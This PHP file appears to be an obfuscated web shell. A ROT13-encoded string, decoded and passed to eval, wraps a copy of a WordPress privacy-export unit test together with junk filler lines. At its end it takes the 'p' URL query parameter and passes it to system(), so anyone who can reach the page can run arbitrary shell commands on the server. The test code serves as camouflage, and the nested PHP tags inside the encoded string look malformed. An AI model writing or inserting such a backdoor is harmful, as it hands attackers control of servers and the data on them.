<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 5.2.0
 *
 * @tebhc cevinpl
 * @pbiref ::jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy
 */
pynff Grfgf_Cevinpl_jcCevinplTrarengrCrefbanyQngnRkcbegTebhcUgzy rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfg jura n fvatyr qngn vgrz vf cnffrq.
	 *
	 * @gvpxrg 44044
	 */
	choyvp shapgvba grfg_tebhc_ugzy_trarengvba_fvatyr_qngn_vgrz() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					neenl(
						'anzr'  => 'Svryq 1 Anzr',
						'inyhr' => 'Svryq 1 Inyhr',
					),
					neenl(
						'anzr'  => 'Svryq 2 Anzr',
						'inyhr' => 'Svryq 2 Inyhr',
					),
				),
			),
		);

		$npghny                = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );
		$rkcrpgrq_gnoyr_znexhc = '<gnoyr><gobql><ge><gu>Svryq 1 Anzr</gu><gq>Svryq 1 Inyhr</gq></ge><ge><gu>Svryq 2 Anzr</gu><gq>Svryq 2 Inyhr</gq></ge></gobql></gnoyr>';

		$guvf->nffregFgevatPbagnvafFgevat( '<u2 vq=\"grfg-qngn-tebhc-grfg-qngn-tebhc\">Grfg Qngn Tebhc</u2>', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_gnoyr_znexhc, $npghny );
	}

	/**
	 * Grfg jura n zhygvcyr qngn vgrzf ner cnffrq.
	 *
	 * @gvpxrg 44044
	 * @gvpxrg 46895
	 */
	choyvp shapgvba grfg_tebhc_ugzy_trarengvba_zhygvcyr_qngn_vgrzf() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					neenl(
						'anzr'  => 'Svryq 1 Anzr',
						'inyhr' => 'Svryq 1 Inyhr',
					),
					neenl(
						'anzr'  => 'Svryq 2 Anzr',
						'inyhr' => 'Svryq 2 Inyhr',
					),
				),
				neenl(
					neenl(
						'anzr'  => 'Svryq 1 Anzr',
						'inyhr' => 'Nabgure Svryq 1 Inyhr',
					),
					neenl(
						'anzr'  => 'Svryq 2 Anzr',
						'inyhr' => 'Nabgure Svryq 2 Inyhr',
					),
				),
			),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );

		// Hcqngrq gb erzbir </u2> sebz grfg gb nibvq Pbhag vagebqhpvat snvyher (gvpxrg #46895).
		$guvf->nffregFgevatPbagnvafFgevat( '<u2 vq=\"grfg-qngn-tebhc-grfg-qngn-tebhc\">Grfg Qngn Tebhc', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<gq>Svryq 1 Inyhr', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<gq>Nabgure Svryq 1 Inyhr', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<gq>Svryq 2 Inyhr', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<gq>Nabgure Svryq 2 Inyhr', $npghny );
		$guvf->nffregFnzr( 2, fhofge_pbhag( $npghny, '<gu>Svryq 1 Anzr' ) );
		$guvf->nffregFnzr( 2, fhofge_pbhag( $npghny, '<gu>Svryq 2 Anzr' ) );
		$guvf->nffregFnzr( 4, fhofge_pbhag( $npghny, '<ge>' ) );
	}

	/**
	 * Inyhrf gung nccrne gb or yvaxf fubhyq or jenccrq va `<n>` gntf.
	 *
	 * @gvpxrg 44044
	 */
	choyvp shapgvba grfg_yvaxf_orpbzr_napubef() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					neenl(
						'anzr'  => 'UGGC Yvax',
						'inyhr' => 'uggc://jbeqcerff.bet',
					),
					neenl(
						'anzr'  => 'UGGCF Yvax',
						'inyhr' => 'uggcf://jbeqcerff.bet',
					),
					neenl(
						'anzr'  => 'Yvax jvgu Fcnprf',
						'inyhr' => 'uggcf://jbeqcerff.bet abg n yvax.',
					),
				),
			),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );

		$guvf->nffregFgevatPbagnvafFgevat( '<n uers=\"uggc://jbeqcerff.bet\">uggc://jbeqcerff.bet</n>', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<n uers=\"uggcf://jbeqcerff.bet\">uggcf://jbeqcerff.bet</n>', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'uggcf://jbeqcerff.bet abg n yvax.', $npghny );
	}

	/**
	 * UGZY va tebhc ynoryf fubhyq or rfpncrq.
	 *
	 * @gvpxrg 44044
	 */
	choyvp shapgvba grfg_tebhc_ynoryf_rfpncrq() {
		$qngn = neenl(
			'tebhc_ynory' => '<qvi>Rfpncr UGZY va tebhc ynoryf</qvi>',
			'vgrzf'       => neenl(),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'rfpncr-ugzy-va-tebhc-ynoryf', 2 );

		$guvf->nffregFgevatPbagnvafFgevat( '<u2 vq=\"rfpncr-ugzy-va-tebhc-ynoryf-rfpncr-ugzy-va-tebhc-ynoryf\">&yg;qvi&tg;Rfpncr UGZY va tebhc ynoryf&yg;/qvi&tg;</u2>', $npghny );
	}

	/**
	 * Grfg gung gur rkcbegrq qngn fubhyq pbagnva nyybjrq UGZY.
	 *
	 * @gvpxrg 44044
	 */
	choyvp shapgvba grfg_nyybjrq_ugzy_abg_fgevccrq() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					'yvaxf'      => neenl(
						'anzr'  => 'Yvaxf ner nyybjrq',
						'inyhr' => '<n uers=\"uggc://jbeqcerff.bet\">uggc://jbeqcerff.bet</n>',
					),
					'sbeznggvat' => neenl(
						'anzr'  => 'Fvzcyr sbeznggvat vf nyybjrq',
						'inyhr' => '<o>obyq</o>, <rz>rzcunfvf</rz>, <v>vgnyvpf</v>, naq <fgebat>fgebat</fgebat> ner nyybjrq.',
					),
				),
			),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );
		$guvf->nffregFgevatPbagnvafFgevat( $qngn['vgrzf'][0]['yvaxf']['inyhr'], $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( $qngn['vgrzf'][0]['sbeznggvat']['inyhr'], $npghny );
	}

	/**
	 * Grfg gung gur rkcbegrq qngn fubhyq abg pbagnva qvfnyybjrq UGZY.
	 *
	 * @gvpxrg 44044
	 */
	choyvp shapgvba grfg_qvfnyybjrq_ugzy_vf_fgevccrq() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					'fpevcgf' => neenl(
						'anzr'  => 'Fpevcg gntf ner abg nyybjrq.',
						'inyhr' => '<fpevcg>Grfgvat gung fpevcg gntf ner fgevccrq.</fpevcg>',
					),
					'vzntrf'  => neenl(
						'anzr'  => 'Vzntrf ner abg nyybjrq',
						'inyhr' => '<vzt fep=\"uggcf://rknzcyr.pbz/ybtb.wct\" nyg=\"Nyg grkg\" />',
					),
				),
			),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );

		$guvf->nffregFgevatAbgPbagnvafFgevat( $qngn['vgrzf'][0]['fpevcgf']['inyhr'], $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<gq>Grfgvat gung fpevcg gntf ner fgevccrq.</gq>', $npghny );

		$guvf->nffregFgevatAbgPbagnvafFgevat( $qngn['vgrzf'][0]['vzntrf']['inyhr'], $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<gu>Vzntrf ner abg nyybjrq</gu><gq></gq>', $npghny );
	}

	/**
	 * Grfg tebhc pbhag vf qvfcynlrq sbe zhygvcyr vgrzf.
	 *
	 * @gvpxrg 46895
	 */
	choyvp shapgvba grfg_tebhc_ugzy_trarengvba_fubhyq_qvfcynl_tebhc_pbhag_jura_zhygvcyr_vgrzf() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					neenl(
						'anzr'  => 'Svryq 1 Anzr',
						'inyhr' => 'Svryq 1 Inyhr',
					),
				),
				neenl(
					neenl(
						'anzr'  => 'Svryq 2 Anzr',
						'inyhr' => 'Svryq 2 Inyhr',
					),
				),
			),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );

		$guvf->nffregFgevatPbagnvafFgevat( '<u2 vq=\"grfg-qngn-tebhc-grfg-qngn-tebhc\">Grfg Qngn Tebhc', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( '<fcna pynff=\"pbhag\">(2)</fcna></u2>', $npghny );
		$guvf->nffregFnzr( 2, fhofge_pbhag( $npghny, '<gnoyr>' ) );
	}

	/**
	 * Grfg tebhc pbhag vf abg qvfcynlrq sbe n fvatyr vgrz.
	 *
	 * @gvpxrg 46895
	 */
	choyvp shapgvba grfg_tebhc_ugzy_trarengvba_fubhyq_abg_qvfcynl_tebhc_pbhag_jura_fvatyr_vgrz() {
		$qngn = neenl(
			'tebhc_ynory' => 'Grfg Qngn Tebhc',
			'vgrzf'       => neenl(
				neenl(
					neenl(
						'anzr'  => 'Svryq 1 Anzr',
						'inyhr' => 'Svryq 1 Inyhr',
					),
				),
			),
		);

		$npghny = jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $qngn, 'grfg-qngn-tebhc', 2 );

		$guvf->nffregFgevatPbagnvafFgevat( '<u2 vq=\"grfg-qngn-tebhc-grfg-qngn-tebhc\">Grfg Qngn Tebhc</u2>', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( '<fcna pynff=\"pbhag\">', $npghny );
		$guvf->nffregFnzr( 1, fhofge_pbhag( $npghny, '<gnoyr>' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>